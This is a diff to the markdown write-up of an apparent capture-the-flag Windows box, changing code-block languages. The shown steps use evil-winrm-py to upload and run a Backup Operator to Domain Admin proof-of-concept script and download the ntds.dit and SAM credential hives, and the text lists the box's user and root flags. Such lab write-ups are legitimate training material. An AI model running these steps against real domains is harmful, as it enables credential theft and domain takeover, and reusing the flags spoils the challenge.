@@ -264,19 +264,19 @@ evil-winrm-py PS C:\Users\svc_backup\Documents> type ../desktop/user.txt
 **Exploitation steps:**
 
 **Step 1:** Upload the PoC [Script](https://github.com/G4sp4rCS/backup-operator-to-domain-admin-POC)
-```bash
+```powershell
 # Command
 evil-winrm-py PS C:\Users\svc_backup\Documents> upload ../../../../../home/Yuval/Tools/backup-operator-to-domain-admin-POC/backupToDA.ps1 .
 ```
 
 **Step 2:** Run the PoC
-```bash
+```powershell
 # Command
 .\backupToDA.ps1
 ```
 
 **Step 3:** Download all the extracted hives
-```bash
+```powershell
 # Command
 evil-winrm-py PS C:\Users\svc_backup\Documents> download ntds\ntds.dit .
 evil-winrm-py PS C:\Users\svc_backup\Documents> download SAM .
@@ -322,6 +322,8 @@ evil-winrm-py PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
 **Flags:**
 - User: `3920bb317a0bef51027e2852be64b543`
 - Root: `4375a629c7c67c8e29db269060c955cb`
+
+
 ---
 
 ## References
